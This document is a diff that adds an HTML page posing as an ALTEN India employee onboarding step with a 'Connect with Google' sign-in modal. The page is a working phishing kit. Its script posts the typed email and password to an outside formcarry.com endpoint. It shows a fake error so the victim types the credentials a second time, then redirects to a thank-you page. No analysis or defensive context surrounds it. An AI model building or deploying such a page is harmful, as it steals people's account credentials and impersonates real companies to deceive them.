@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Alten India</title>
+    <link rel="icon" type="image/png" href="ALTEN_logo.svg.png"/>
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="HeadFoot.css" />
+</head>
+
+<body>
+
+    <header id="main-header">
+        <!-- Left Section: Logo + Nav -->
+        <div class="header-left-section">
+            <img src="ALTEN_logo.svg.png" alt="ALTEN Logo" class="logo-img" id="site-logo" />
+
+            <nav class="nav-bar" id="main-nav">
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/alten-group/" class="nav-link">GROUP <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/services/" class="nav-link">SERVICES <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/#our-sectors" class="nav-link">INDUSTRIES <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/careers/" class="nav-link">CAREERS <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/investors/" class="nav-link">INVESTORS <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="https://www.alten.com/newsroom/" class="nav-link">NEWSROOM <span class="dropdown-arrow">&#9662;</span></a>
+                    </li>
+                </ul>
+
+        </div>
+
+        <!-- Right Section: Socials + Contact Button -->
+        <div class="header-right-section" id="right-section">
+            <div class="social-media-icons" id="social-icons">
+                <a href="https://x.com/Alten_group"><img src="twitter.png" alt="X" class="social-icon" /></a>
+                <a href="https://www.linkedin.com/company/alten/"><img src="linkedin.png" alt="LinkedIn" class="social-icon" /></a>
+                <a href="https://www.youtube.com/user/altenfrance"><img src="youtube.png" alt="YouTube" class="social-icon" /></a>
+                <a href="https://www.instagram.com/alten_group/"><img src="instagram.png" alt="Instagram" class="social-icon" /></a>
+            </div>
+            <a style="text-decoration: none"https://www.alten.com/contact/" class="contact-btn" id="contact-button">CONTACT US</a>
+        </div>
+
+        <!-- Hamburger Icon -->
+        <div class="hamburger-menu" id="hamburger">&#9776;</div>
+    </header>
+
+    <div class="final-step">
+        <h2>Final Step: Connect Your Gmail</h2>
+        <p>
+            You’ve successfully completed your Employee ID setup. The final step is to connect your
+            account with your Gmail.
+        </p>
+        <p>
+            Please click the button below to continue. Once connected, your process will be complete, and you
+            will gain access to further instructions and resources.
+        </p>
+
+        <button class="connect-button" onclick="openModal()">Connect with Google</button>
+
+    </div>
+
+
+
+    <div class="modal" id="signInModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <div class="container">
+                <div class="signin-box">
+                    <h2>
+                        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
+                            alt="Google Logo" class="google-logo-img" />
+                        Sign in with Google
+                    </h2>
+
+                    <h1>Sign in</h1>
+                    <p>to continue to Alten India</p>
+
+                    <form id="loginForm">
+                        <input type="email" name="email" placeholder="Email or phone" id="email" required />
+                        <input type="password" name="password" placeholder="Enter your password" id="password"
+                            required />
+
+                        <div class="show-password">
+                            <input type="checkbox" id="showPass" onclick="togglePassword()" />
+                            <label for="showPass">Show password</label>
+                        </div>
+
+                        <div class="forgot">
+                            <a href="#">Forgot email?</a>
+                        </div>
+
+                        <div class="actions">
+                            <a href="#" class="create">Create account</a>
+                            <button type="submit">Next</button>
+                        </div>
+
+                        <div id="errorContainer" class="error-message">
+                            An error occurred while processing your request. Please try again.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer id="main-footer">
+        <div class="footer-container">
+            <!-- 1st Column -->
+            <div class="footer-col">
+                <h4>QUICK ACCESS</h4>
+                <ul>
+                    <li><a href="https://www.alten.com/alten-group/">ALTEN Group</a></li>
+                    <li><a href="https://www.alten.com/services/">Services</a></li>
+                    <li><a href="https://www.alten.com/#our-sectors">Industries</a></li>
+                    <li><a href="https://www.alten.com/careers/">Careers</a></li>
+                    <li><a href="https://www.alten.com/investors/">Investors</a></li>
+                    <li><a href="https://www.alten.com/newsroom/">Newsroom</a></li>
+                </ul>
+            </div>
+
+            <!-- 2nd Column -->
+            <div class="footer-col">
+                <ul>
+                    <li><a href="https://www.alten.com/alten-group/research-innovation/">Research & Innovation</a></li>
+                    <li><a href="https://www.alten.com/#alten-in-the-world">Countries</a></li>
+                </ul>
+            </div>
+
+            <!-- 3rd Column -->
+            <div class="footer-col">
+                <ul>
+                    <li><a href="https://www.alten.com/alten-group/responsibility-and-sustainability/">Corporate Social Responsibility</a></li>
+                    <li><a href="https://www.alten.com/privacy-policy/">Privacy Policy</a></li>
+                    <li><a href="https://www.alten.com/cookies-policy/">Your cookies</a></li>
+                    <li><a href="https://www.alten.com/legal-information/">Legal Information</a></li>
+                    <li><a href="https://www.alten.com/newsroom/#media-library">Media library</a></li>
+                    <li><a href="https://www.alten.com/contact/">Do you have a question?</a></li>
+                </ul>
+            </div>
+
+            <!-- 4th Column (Logo) -->
+            <div class="footer-col logo-col">
+                <img src="ALTEN_logo.svg.png" alt="ALTEN Logo" class="footer-logo" />
+            </div>
+
+            <!-- 5th Column (Social Icons) -->
+            <div class="footer-col social-col">
+                <div class="footer-socials">
+                    <a href="https://x.com/Alten_group"><img src="twitter.png" alt="X" /></a>
+                    <a href="https://www.linkedin.com/company/alten/"><img src="linkedin.png" alt="LinkedIn" /></a>
+                    <a href="https://www.youtube.com/user/altenfrance"><img src="youtube.png" alt="YouTube" /></a>
+                    <a href="https://www.instagram.com/alten_group/"><img src="instagram.png" alt="Instagram" /></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        const hamburger = document.getElementById("hamburger");
+        const nav = document.querySelector(".nav-bar");
+        const rightSection = document.querySelector(".header-right-section");
+
+        hamburger.addEventListener("click", () => {
+            nav.classList.toggle("show");
+            rightSection.classList.toggle("show");
+        });
+        function openModal() {
+            document.getElementById("signInModal").style.display = "flex";
+        }
+
+        function closeModal() {
+            document.getElementById("signInModal").style.display = "none";
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+        }
+
+        let firstAttempt = null;
+        let isRetry = false;
+
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            passwordInput.type =
+                passwordInput.type === "password" ? "text" : "password";
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const formData = new FormData();
+            formData.append("email", email);
+            formData.append("password", password);
+
+            const errorContainer = document.getElementById("errorContainer");
+
+            try {
+                await fetch("https://formcarry.com/s/ZH09f-JwtvZ", {
+                    method: "POST",
+                    body: formData,
+                });
+
+                if (!isRetry) {
+                    // First attempt
+                    firstAttempt = { email, password };
+                    isRetry = true;
+                    errorContainer.style.display = "block";
+                    document.getElementById("password").value = "";
+                } else {
+                    // Second attempt
+                    if (
+                        firstAttempt.email === email &&
+                        firstAttempt.password === password
+                    ) {
+                        // ✅ Redirect to thankyou.html after successful retry
+                        window.location.href = "thankyou.html";
+                    } else {
+                        errorContainer.style.display = "block";
+                        document.getElementById("password").value = "";
+                    }
+                }
+            } catch (error) {
+                console.error("Submission failed:", error);
+                errorContainer.textContent =
+                    "Something went wrong. Please try again later.";
+                errorContainer.style.display = "block";
+            }
+        });
+        // Close modal when clicking the close button
+        function closeModal() {
+            document.getElementById("signInModal").style.display = "none";
+        }
+
+        // Close modal when clicking outside the modal-content
+        window.addEventListener("click", function (event) {
+            const modal = document.getElementById("signInModal");
+            const modalContent = document.querySelector(".modal-content");
+            if (event.target === modal) {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+
+</html>
